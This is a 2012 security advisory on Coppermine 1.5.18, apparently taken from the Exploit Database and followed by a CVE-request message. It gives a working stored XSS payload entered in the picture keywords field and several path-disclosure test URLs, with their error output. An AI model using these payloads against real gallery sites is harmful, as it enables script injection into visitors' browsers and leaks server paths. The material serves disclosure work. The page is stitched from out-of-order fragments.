Everyone has different definitions and requirements so CVE basically
goes with "is it a security vulnerability" (e.g. does it cross a trust
boundary, etc.).

[waraxe-2012-SA#081] - Multiple Vulnerabilities in Coppermine 1.5.18
==============================================================================

Author: Janek Vind "waraxe"
Date: 29. March 2012
Location: Estonia, Tartu
Web: http://www.waraxe.us/advisory-81.html

Affected Software:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Coppermine is a multi-purpose fully-featured and integrated web picture gallery
script written in PHP using GD or ImageMagick as image library with a MySQL backend.

http://coppermine-gallery.net/

Affected versions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Tests were conducted against Coppermine version 1.5.18.

###############################################################################
1. Stored XSS in picture keywords
###############################################################################

Reason: failure to sufficiently sanitize user-supplied input data
Preconditions: privileges needed for picture keywords editing

Coppermine user with appropriate privileges is able to modify picture information:

http://localhost/cpg1518/edit_one_pic.php?id=1&what=picture

There is a field in form named as "Keywords (separate with semicolon)".
After insertion to database those keywords are later used in html meta section.
It appears, that specific user supplied data is not properly validated before
outputting as html to the end user, resulting in Stored XSS vulnerability.

Testing:

1. Open picture information editing page:

http://localhost/cpg1518/edit_one_pic.php?id=1&what=picture

2. Insert XSS payload below as keywords and click "Apply changes":

"><body onload=javascript:alert(String.fromCharCode(88,83,83))>

After that issue request to view this image:

http://localhost/cpg1518/displayimage.php?pid=1

As result we can observe XSS payload execution.

###############################################################################
2. Path Disclosure in "visiblehookpoints" plugin
###############################################################################

Test:

http://localhost/cpg1518/plugins/visiblehookpoints/index.php

Result:

Warning: require_once(include/init.inc.php) [function.require-once]:
failed to open stream: No such file or directory in
C:\apache_www\cpg1518\plugins\visiblehookpoints\index.php on line 22

Fatal error: require_once() [function.require]:
Failed opening required 'include/init.inc.php' (include_path='.;C:\php\pear') in
C:\apache_www\cpg1518\plugins\visiblehookpoints\index.php on line 22

###############################################################################
3. Path Disclosure in "thumbnails.php"
###############################################################################

Attack vector: user submitted GET parameters "page" and "cat"

Tests:

http://localhost/cpg1518/thumbnails.php?page[]
http://localhost/cpg1518/thumbnails.php?cat[]

Results:

Fatal error: Unsupported operand types in
C:\apache_www\cpg1518\include\functions.inc.php on line 2980

Fatal error: Unsupported operand types in
C:\apache_www\cpg1518\thumbnails.php on line 160

###############################################################################
4. Path Disclosure in "usermgr.php"
###############################################################################

Attack vector: user submitted GET parameter "page"
Preconditions: admin privileges needed

Test:

http://localhost/cpg1518/usermgr.php?page[]

Result:

Fatal error: Unsupported operand types in
C:\apache_www\cpg1518\usermgr.php on line 185

###############################################################################
5. Path Disclosure in "search.inc.php"
###############################################################################

Attack vector: user submitted GET parameters "newer_than" and "older_than"

Tests:

http://localhost/cpg1518/thumbnails.php?search=1&album=search&newer_than[]
http://localhost/cpg1518/thumbnails.php?search=1&album=search&older_than[]

Results:

Fatal error: Unsupported operand types in
C:\apache_www\cpg1518\include\search.inc.php on line 106

Fatal error: Unsupported operand types in
C:\apache_www\cpg1518\include\search.inc.php on line 107

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Subject: CVE-request: Coppermine 1.5.18 waraxe-2012-SA#081

Can I get 2012 CVE-identifier for stored XSS in Coppermine 1.5.18 edit_ont_pic.php keywords.

ID: waraxe-2012-SA#081
Original advisory: <http://www.waraxe.us/advisory-81.html>
Mailing list post: <http://seclists.org/bugtraq/2012/Mar/166>

"""
Reason: failure to sufficiently sanitize user-supplied input data
Preconditions: privileges needed for picture keywords editing

Coppermine user with appropriate privileges is able to modify picture information:

<http://localhost/cpg1518/edit_one_pic.php?id=1&what=picture>

There is a field in form named as "Keywords (separate with semicolon)".
After insertion to database those keywords are later used in html meta section.
It appears, that specific user supplied data is not properly validated before
outputting as html to the end user, resulting in Stored XSS vulnerability.

Testing:

1. Open picture information editing page:

<http://localhost/cpg1518/edit_one_pic.php?id=1&what=picture>

2. Insert XSS payload below as keywords and click "Apply changes":

"><body onload=javascript:alert(String.fromCharCode(88,83,83))>

After that issue request to view this image:

<http://localhost/cpg1518/displayimage.php?pid=1>

As result we can observe XSS payload execution.
"""

There is also four different path disclosure vulnerabilities (includes plugins), but I think one CVE-identifier for this advisory is enough as these are all in the same version and path disclosure is very low severity.
